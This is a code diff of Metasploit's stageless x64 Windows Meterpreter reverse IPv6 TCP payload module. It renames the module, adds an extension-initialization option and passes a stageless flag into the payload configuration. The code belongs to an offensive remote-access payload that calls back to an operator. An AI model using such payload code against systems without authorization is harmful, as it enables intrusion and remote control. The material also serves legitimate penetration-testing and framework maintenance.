@@ -1,9 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/payload/transport_config'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/core/payload/windows/x64/meterpreter_loader'
@@ -11,9 +10,9 @@ require 'msf/base/sessions/meterpreter_x64_win'
 require 'msf/base/sessions/meterpreter_options'
 require 'rex/payloads/meterpreter/config'
 
-module Metasploit4
+module MetasploitModule
 
-  CachedSize = 1187890
+  CachedSize = 205891
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
@@ -35,13 +34,15 @@ module Metasploit4
       ))
 
     register_options([
-      OptString.new('EXTENSIONS', [false, "Comma-separate list of extensions to load"]),
+      OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load']),
+      OptString.new('EXTINIT',    [false, 'Initialization strings for extensions']),
       OptInt.new("SCOPEID", [false, "The IPv6 Scope ID, required for link-layer addresses", 0])
-    ], self.class)
+    ])
   end
 
-  def generate
-    stage_meterpreter(true) + generate_config
+  def generate(opts={})
+    opts[:stageless] = true
+    stage_meterpreter(opts) + generate_config(opts)
   end
 
   def generate_config(opts={})
@@ -54,7 +55,9 @@ module Metasploit4
       expiration: datastore['SessionExpirationTimeout'].to_i,
       uuid:       opts[:uuid],
       transports: [transport_config_reverse_ipv6_tcp(opts)],
-      extensions: (datastore['EXTENSIONS'] || '').split(',')
+      extensions: (datastore['EXTENSIONS'] || '').split(','),
+      ext_init:   (datastore['EXTINIT'] || ''),
+      stageless:  true
     }
 
     # create the configuration instance based off the parameters
@@ -63,7 +66,6 @@ module Metasploit4
     # return the binary version of it
     config.to_b
   end
-
 end
 
 
